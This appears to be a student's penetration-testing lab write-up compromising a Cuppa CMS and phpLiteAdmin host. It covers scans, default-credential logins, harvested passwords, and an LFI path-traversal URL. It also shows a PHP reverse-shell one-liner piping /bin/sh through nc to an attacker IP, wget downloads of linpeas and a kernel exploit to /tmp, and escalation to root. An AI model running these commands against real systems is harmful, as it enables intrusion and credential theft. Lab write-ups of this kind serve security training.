Report

Report

1. SYN stealth scan to find open TCP ports.
`sudo nmap -p- 10.11.1.116`
![be07a8db7b3bec9b12fa33a5f73f2ce4.png](99ab517a3ef04db28682b9160989e001.png)


2. Run a service detection scan on the open TCP ports.
`sudo nmap -p21,22,80,110,143 -sV -A 10.11.1.116`
![ccb77aafbd551ecb89c5c68d02f29edd.png](47a00a355b86434392ce99bb4d6b5078.png)


3. Run a non-recursive dirb scan. Found 2 interesting directories: /administrator and /db
`dirb http://10.11.1.116 -r`
![9fcc5cc49304a9a555e6dd64adf29069.png](02bef4b7f8364b2a87882c97ed2a303d.png)


3. View the login page for Cuppa CMS
http://10.11.1.116/administrator/
![7ee3c5ff6e334ca8f2bb40277be78937.png](2d66032ad463462790476e54d9e91dba.png)


4. Google search for default credentials for Cuppa CMS. Search term: **default credentials Cuppa CMS** 
![0fa1980a6a76a8341112cad18d3287ce.png](e120af1c4985485dbac4f362b801b245.png)


5. The first hit is official cuppa cms documentation. Click on that link https://www.cuppacms.com/en/docs/installation. Scrolling down, we see they specify default username and password (admin:admin). 
![0e60917815189732ac0a617fa0b70acf.png](c80a5ca9a796444696210b4d9bd3bba6.png)


6. Attempt to log into Cuppa CMS using admin:admin. It works!
![b1bb02fec8eb4e0731ea1b2c016d908d.png](01d9c242cdf14e589fafc503ed37ad2c.png)


7. We are presented with the administrator interface.
![592d5847472d4e34ca9477a8d8d23aae.png](38bd334f22e84a4b9cdf3391be72ba69.png)


8. View the Cuppa CSM general configuration. Take note of the database info including the username/password **root:99bbVDdorGzfZJun**
![f9a68da954781d1f5e622cc0a40e32fe.png](09bfded4e32a4bc2b1b146eb36672eff.png)


9. View the Cupa CMS profile, user accounts, user groups
![5a90681b7afddea3a378b6b6ecd49c9f.png](23b46ae42c794b2c8ad33acbcdf5aa8d.png)
![6bb5438a5d94e7d725aab83dec087972.png](3adb6d16b0714b4483d02376e5d8fe8b.png)
![f5edd6c605fc1d81438ad52fe7d8996f.png](3aff3a3cb81645eb9e3416707ad39eb0.png)


10. Now let's review the other interesting directory found by dirb.
http://10.11.1.116/db/
![d202d3461b940a860dd085f2ede34c7e.png](649903b6ee024553980654b3ec3ad39c.png)


11. Click on the phpLiteAdmin link. We are directed to a page
login page for phpLiteAdmin. A google search for **phpLiteAdmin default password** indicates that the password is admin
![51b6c2e5376d3e95d2f6806c21af7e9b.png](15f665d0a3f3496cb4c947da8528f521.png)


12. Log into phpLiteAdmin using password admin
![9b53f88290f2e20dee70bd5949e8c081.png](55fb75082e7e4d32866b463c0b73cad0.png)


13. We are presented with this page
![e7e68b09656b7f8d4d5551fee7262e22.png](4cbdb42107a9415baba64fa5877a506a.png)


14. There credentials table in the 'users' database has several entries
1aaron:italia99:5978a63b4654c73c60fa24f836386d87
accasia:WindRunner:a1420fc5ab116437368889400c4bb8e1
bethanyjoy02::6c0f3fde58158e4c1f4cedb29c7ef4c1
deanna:marianna:f463f63616cb3f1e81ce46b39f882fd5
jpotter:vipsu:9b38e2b1e8b12f426b0d208a7ab6cb98
![231526b2f327a9ef5e0f0c6dc0af12bc.png](d4ce15722bd046bb837bc2f1ee3bf9c8.png)


15. Run Nikto scan. It specifies that /administrator and /db are interesting.
`nikto -h 10.11.1.116`
![c6607d05e12399dd71fdcd8261d1d93c.png](2bbbb643d8bd43749aad49a583b97c81.png)


16. Searchsploit Cuppa CMS
`searchsploit cuppa`
![6b0f586902f5c8606b42e23f5e75cc8b.png](b7949a2631de4e1d96989604f9480077.png)


17. Download Exploit Title: Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion, path php/webapps/25971.txt
![a7fca4f741e0baa145e2b4b2718a2dd7.png](9c8e4640aef64a1598015ad718749211.png)


18. Attempt to exploit Cuppa CMS LFI/RFI exploit on the target. It works for directory traversal!
`http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`
![9c49c98bc5b6cc90e829d448393220eb.png](7d677a22add14dd0aad607cf969dd3c8.png)


19. Searchsploit phpLiteAdmin
`searchsploit phpLiteAdmin`
![5c9a9ff972e4f747b5892c173cedbc08.png](2c6a644f946c4c3d9293a613b57b6c0e.png)


20. Download exploit title PHPLiteAdmin 1.9.3 - Remote PHP Code Injection, path php/webapps/24044.txt
`searchsploit -m 24044`
![b0244110b716e48b3dc677e26943dbab.png](3429dbb8b7ec46d5a2ad8cbeac4aafc1.png)


8. Attempt RFI by using the phpLiteAmin exploit 24044.txt????????????

21. In phpLiteAdmin, create a new database named hack.sqlite
![68ca9ee88d952ef89ffb569e85b91644.png](201b13880fab438fa45c0bf354991879.png)


22. Change to the hack.sqlite database by clicking on it in the 'Change Database' section.
![35142183e0b4569b49241a9af15e6a17.png](7da92ebeafb842d99af0aa274d61c637.png)


23. Click the 'Rename Database' tab, Rename hack.sqlite to hack.php
![ef6a3de0fed43f1f6569f20080780149.png](7229bccd84094cb099fef3942e3ae6c8.png)


24. Add a new table to hack.php. This example named it 'hacktable' and input number of fields = 1
![1eda0f69605c13adbe7766b331b6009e.png](250a59765e0d4d07a398c7abe844b32d.png)
![914b732f5b8b02914cfa98eed5ccd7e4.png](72f5a4db054a4c5faa1a798f3d4462a1.png)


25. Add a new field. This example named it 'hackfield', type 'TEXT', and Default Value is a php command for a reverse shell. The following php code uses netcat client to connect to our kali attack machine on port 1937:

`<?php echo shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.214 1937 >/tmp/f") ?>`

![ea3797b268304219be12e248b5171c87.png](6ba97b282d104f4f80bfda1082ad2c86.png)


26. Click the Create button. The output should verify that table 'hacktable' has been created
![a81cc16caaf862dbd02aae6dfef481d2.png](52bd373f96e44afba3cb49a96655a51a.png)

Close-up view of the php code
![86703d1ec41ffe13d3a146539f996818.png](639418bf8d484519bfcd326edbe58af0.png)


27. Click the 'Return' link. Verify the path where the injected php code is stored. It is indicated by the **Path to database:** This is the LFI. The path to this code is: /usr/local/databases/hack.php
![7e1e832b6a0df2f5c25e0fa5c806e19b.png](1d086cf2e5f94951ac3827bf2f989bf5.png)


28. Open a netcat listener on port 1937
`nc -lvnp 1937`
![7e2334341d36d6ed5f7c822647a471b0.png](bdcd6642a0f748859aa90bba54d7e5c7.png)


29. Browse to our code by utilizing the previous Cuppa CMS exploit.
`http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../usr/local/databases/hack.php`
![67009b86b165394f7af55a23d7ab2cd2.png](e6f20b66a3d94b1fbd6b0ff701ded497.png)


30. Notice we now have a reverse shell, and we are user www-data
`whoami`
![57a8c448e2c2c3348596815a4b5de723.png](2c783b7c258a4cecb41815e61dc7d48d.png)


31. Locate where the tool linpeas.sh is stored
`locate linpeas.sh`
![a696b0923c680b18921350f4e9a4662a.png](cb4cec888a674af6882287944a71baec.png)


32. Change to the directory where linpeas.sh is stored
`cd /home/kali/gitWorkspace/tools/privilege-escalation-awesome-scripts-suite/linPEAS`
![8f9842891769677d12a3cd63c198f1be.png](4e695db2fe12481a8c5c85b631ed6a85.png)


33. Start a python server
`sudo python -m SimpleHTTPServer 5678`
![7e282377cabf747ff444a23aae2f099e.png](40d61fd6eca04449ba455da991d39be9.png)


34. On the target, change to the world-writable directory /tmp, then download linpeas.sh using wget
`cd /tmp` 
`wget http://192.168.119.214:5678/linpeas.sh /tmp`
![e4bc448afeaa47dcf91b285b761e537a.png](66f7e593a6264d879b4f05d5989ace67.png)


35. Notice that the netcat listener on Kali should show the GET request from the target 
![d503244cc4b1cb3d00312043bdf8ee36.png](7d4eaada3dcb4f2b8193865e32ac264b.png)


36. Change the permissions so that linpeas.sh can be executed
`chmod +x linpeas.sh`
![b75ecde6ee531c4f8741f24cbe74bdeb.png](36f7ce76715c48c482aaa624f68ee6a1.png)


37. Run linpeas.sh and redirect to a file.
`./linpeas.sh > linout.txt`


38. We can view the content of linout.txt The first item that absolutely must be looked at (in red font) is the OS version which is: Linux version 4.4.0-116-generic
`head -n 100 linout.txt`
![fc239ced94ceae95b2626eeaf77a8966.png](fd5d54bb96384d7da51b956e44cc72ad.png)
![d77efb8fb75126de76c0e2fca1ed2879.png](9733b26861ba4389badfad651fc4a0e3.png)


39. Searchsploit 'Ubuntu 4.4.0-116'
`searchsploit ubuntu 4.4.0-116`
![a183c8b18a58929158428ad88533a839.png](846e94eadb7c40418ba487fa05c00616.png)


40. Download exploit title: Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation , path linux/local/44298.c
`searchsploit -m 44298`
![a885f6cbf73400677c53244667812d7b.png](37b12abb858742c0b4608a79b1272dcd.png)


41. Compile the exploit
`gcc 44298.c -o exploit`
![9378be8294e06a260660e93b858cbf80.png](2e6f3e90f6434e75b8c64ba0b30f9ff1.png)


42. Run the python simple server command (ensure we killed the previous Python server when we served linpeas.sh) in the directory where the compiled exploit is located
`python -m SimpleHTTPServer 5678`
![5592191b2fa726e6cd4d942ed743ba9b.png](a019ed07b40044a1b82c43b9863da843.png)


43. From the target, download the exploit using wget to /tmp
`wget http://192.168.119.214:5678/exploit`
![085ceac33d175d69c07ff8ca061cbda2.png](d03219492a194826968bbe7f9b435601.png)


44.Change the permissions to make it executable
`chmod +x exploit`
![adaaa0326d08d3462f6c31f35470ded6.png](61deacf43c884d0e8d589e852fb5b161.png)


45. Run the exploit. There will be no output
`./exploit`
![21cc07ed9e865bf1c6b24e3653905bee.png](1ec70cb095f3403d9c0ecdd7a79b1fa9.png)


46. Check user (we are now root!), display IP address, and display proof.txt
`whoami`
`ifconfig`
`cat /root/proof.txt`
![50d589121cabfa08f688dbb1ba276053.png](d25b3f62673b45dc9f882e6181a25034.png)











